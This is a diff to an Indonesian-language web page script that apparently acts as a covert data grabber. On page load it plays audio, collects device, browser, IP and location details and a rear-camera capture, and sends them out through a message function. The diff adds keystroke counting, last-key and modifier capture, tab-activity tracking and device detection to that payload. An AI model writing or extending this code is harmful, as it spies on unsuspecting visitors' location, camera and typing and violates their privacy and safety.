@@ -501,6 +501,54 @@ VPN / Proxy            : ${isVPN}`.trim();
   }
 };
 
+const ambilAktivitasTab = () => {
+  const fokus = document.hasFocus() ? 'Ya' : 'Tidak';
+  const waktuPertama = new Date(performance.timing.navigationStart);
+  const waktuAktif = Math.floor((Date.now() - performance.timing.navigationStart) / 1000);
+
+  return `
+౼ 〘 𝗔𝗞𝗧𝗜𝗙𝗜𝗧𝗔𝗦 𝗧𝗔𝗕 〙 ౼
+Fokus Halaman         : ${fokus}
+Waktu Pertama Dibuka  : ${waktuPertama.toLocaleString('id-ID')}
+Waktu Aktif Total     : ${waktuAktif} detik
+Status Interaksi      : ${document.visibilityState === 'visible' ? 'Aktif' : 'Tidak Aktif'}
+`.trim();
+};
+
+let totalKeyPress = 0;
+let lastKey = '-';
+let kombinasiKhusus = '-';
+
+window.addEventListener('keydown', (e) => {
+  totalKeyPress++;
+  lastKey = e.key;
+  if (e.ctrlKey || e.shiftKey || e.altKey) {
+    kombinasiKhusus = `${e.ctrlKey ? 'Ctrl+' : ''}${e.shiftKey ? 'Shift+' : ''}${e.altKey ? 'Alt+' : ''}`.replace(/\+$/, '');
+  }
+});
+
+const ambilKeyboardActivity = () => {
+  return `
+౼ 〘 𝗞𝗘𝗬𝗕𝗢𝗔𝗥𝗗 𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗬 〙 ౼
+Jumlah Tombol Ditekan : ${totalKeyPress}
+Tombol Terakhir       : ${lastKey}
+Kombinasi Khusus      : ${kombinasiKhusus}
+`.trim();
+};
+
+const ambilPerangkatEksternal = () => {
+  const mouse = matchMedia('(pointer:fine)').matches ? 'Ya' : 'Tidak';
+  const keyboard = navigator.keyboard ? 'Ya' : 'Tidak';
+  const gamepad = navigator.getGamepads?.()[0] ? 'Ya' : 'Tidak';
+
+  return `
+౼ 〘 𝗗𝗘𝗧𝗘𝗞𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 𝗘𝗞𝗦𝗧𝗘𝗥𝗡𝗔𝗟 〙 ౼
+Mouse Terdeteksi      : ${mouse}
+Keyboard Eksternal    : ${keyboard}
+Gamepad Terhubung     : ${gamepad}
+`.trim();
+};
+
 const ambilLokasi = () => {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -566,7 +614,7 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
       }
     };
 
-  const mulai = async () => {
+const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
@@ -577,6 +625,9 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
   const webFeatures = ambilWebAPIFeatures();
   const izinMedia = await ambilIzinMedia();
   const ipInfo = await ambilIPInfo();
+  const aktivitasTab = ambilAktivitasTab();
+  const keyboard = ambilKeyboardActivity();
+  const perangkatEksternal = ambilPerangkatEksternal();
 
   const gabungAwal = [
     infoPerangkat,
@@ -585,7 +636,10 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
     browserInfo,
     webFeatures,
     izinMedia,
-    ipInfo
+    ipInfo,
+    aktivitasTab,
+    keyboard,
+    perangkatEksternal
   ].join("\n\n");
 
   await kirimPesan(gabungAwal);
@@ -598,7 +652,7 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
 
   const belakang = await ambilKamera("environment", "belakang");
   await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
-  };
+};
 
     window.addEventListener("load", mulai);
   </script>
